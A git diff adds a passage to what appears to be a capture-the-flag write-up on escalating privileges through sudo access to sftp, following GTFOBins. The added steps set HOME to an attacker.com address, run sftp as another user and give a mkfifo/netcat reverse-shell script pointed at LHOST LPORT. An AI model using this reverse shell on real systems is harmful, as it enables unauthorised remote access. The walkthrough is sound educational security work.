@@ -51,6 +51,31 @@ Checking [GTFOBins](https://gtfobins.github.io/gtfobins/sftp/#sudo), I found thi
 
 So we can try to do something like this
 
+command:```HOME=blackanon@attacker.com```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a7801fbd-eacc-4043-95f2-1fd60c4bec33)
+
+cool, now run this ```sudo -u gold /usr/bin/sftp $HOST```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8619f907-f430-4fae-a9d2-130d8e6658f4)
+
+oops, we can see that it's ssh running here. So, I decided to trigger the ```help``` menu
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/48337434-ae85-4d2e-b3e1-eb8804b196d1)
+
+We can use that switch to run a program, this means we can try to execute a reverse shell
+
+Payload
+```sh
+#!/bin/bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f
+```
+
+Save this in a ```.sh``` file and send it over to the target
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/b8f56e07-b469-470f-aad8-5ff784b69f10)
+
+Cool, now lets execute that command again, but this time ensure you have your netcat listener set up
 
 
 
